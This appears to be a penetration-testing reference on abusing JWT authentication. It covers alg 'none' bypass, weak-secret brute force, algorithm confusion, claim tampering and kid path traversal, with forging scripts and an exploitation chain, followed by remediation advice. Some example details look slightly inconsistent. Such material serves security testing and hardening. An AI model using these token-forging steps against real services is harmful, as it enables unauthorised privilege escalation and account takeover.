# API Authentication & JWT Abuse

## Overview
API authentication mechanisms based on JWT (JSON Web Tokens) are widely used in modern applications. However, weak implementations often introduce exploitation vectors. This skill covers comprehensive JWT abuse techniques.

## Vulnerability Categories

### 1. None Algorithm Bypass
**Impact:** Critical
**Complexity:** Low

#### Technique
JWT supports the `"alg": "none"` algorithm which disables signature verification.

**Example:**
```
Original JWT: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWUsImV4cCI6OTk5OTk5OTk5OX0.signature

Modified JWT (admin=true): eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWUsImV4cCI6OTk5OTk5OTk5OX0.
```

**Mitigation:**
- Whitelist allowed algorithms (reject "none")
- Server-side validation of algorithm

### 2. Weak Secret Brute Force
**Impact:** High
**Complexity:** Medium

#### Common Weak Secrets
```
secret, password, admin, 12345678, key, token,
flask, django, rails, jwt, null, undefined
```

#### Tool Usage
```bash
hashcat -m 16500 -a 0 jwt_file.txt wordlist.txt
```

#### Detection
- HS256/HS384/HS512 = HMAC (symmetric key)
- Check for weak secrets in source code, comments, documentation

### 3. Algorithm Confusion
**Impact:** High
**Complexity:** Medium

#### Attack Vector
Server expects RS256 (asymmetric) but accepts HS256 (symmetric).

**Exploit:**
1. Obtain RS256 public key from `.well-known/jwks.json`
2. Use public key as HMAC secret
3. Sign token with HS256 using public key
4. Server validates signature using public key as HMAC secret

```python
import hmac
import hashlib
import base64

public_key = open('public_key.pem').read()
header = base64.urlsafe_b64encode(b'{"alg":"HS256"}').decode().strip('=')
payload = base64.urlsafe_b64encode(b'{"sub":"1","admin":true}').decode().strip('=')

signature = base64.urlsafe_b64encode(
    hmac.new(public_key.encode(), f'{header}.{payload}'.encode(), hashlib.sha256).digest()
).decode().strip('=')

token = f"{header}.{payload}.{signature}"
```

### 4. Claim Manipulation
**Impact:** Medium to High
**Complexity:** Low

#### Common Claims to Override
- `admin`: Boolean admin flag
- `role`: User role (user, admin, moderator)
- `exp`: Expiration timestamp (set to far future: 9999999999)
- `sub`: Subject (user ID)
- `scope`: Permission scope

#### Example Payloads
```json
{
  "sub": "1000",
  "name": "Attacker",
  "admin": true,
  "exp": 9999999999,
  "iat": 1516239022
}
```

### 5. Key ID (kid) Injection
**Impact:** Medium
**Complexity:** High

#### Attack
Manipulate `kid` header to reference attacker-controlled key source.

**Example:**
```json
{
  "alg": "HS256",
  "kid": "../../../etc/passwd"
}
```

Server may load key from path traversal vulnerability.

## Detection Methods

### 1. Check Token Expiration
```bash
# Decode token
echo "token_here" | cut -d'.' -f2 | base64 -d

# Check "exp" claim - if missing or far in future: vulnerability
```

### 2. Test None Algorithm
```bash
# Remove the signature part
token_with_none=$(echo "$token" | cut -d'.' -f1-2)".."
```

### 3. Brute Force Secret
```python
import jwt
import requests

weak_secrets = ["secret", "password", "admin", "12345678"]
token = "eyJ..."

for secret in weak_secrets:
    try:
        decoded = jwt.decode(token, secret, algorithms=["HS256"])
        print(f"[+] Secret found: {secret}")
        print(f"[+] Decoded: {decoded}")
    except:
        pass
```

## Exploitation Chain

```
1. Extract JWT from cookie/Authorization header
2. Decode payload (base64)
3. Check for vulnerabilities:
   - alg: "none" present?
   - exp claim missing?
   - admin/role claims present?
4. If weak secret suspected:
   - Brute force with common passwords
5. If algorithm confusion possible:
   - Try HS256 with public key from JWKS
6. Generate forged token with:
   - admin=true, exp=9999999999
7. Send forged token in request
8. Verify elevated access
```

## Remediation

✅ **Server-Side Fixes:**
- Whitelist allowed algorithms (reject none, HS256 if RS256 expected)
- Validate token signature server-side ALWAYS
- Use strong secrets for HS* algorithms (min 256 bits)
- Set reasonable expiration times (15-30 minutes)
- Add additional claims (jti - JWT ID for revocation)
- Rotate keys regularly

✅ **Client-Side Fixes:**
- Never trust client-side token validation alone
- Validate signature expiration
- Implement token refresh mechanism
- Secure token storage (httpOnly cookies, not localStorage)

## References
- [OWASP JWT Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html)
- [JWT.io Debugger](https://jwt.io)
- [CVE-2016-9575 - JWT None Algorithm](https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/)
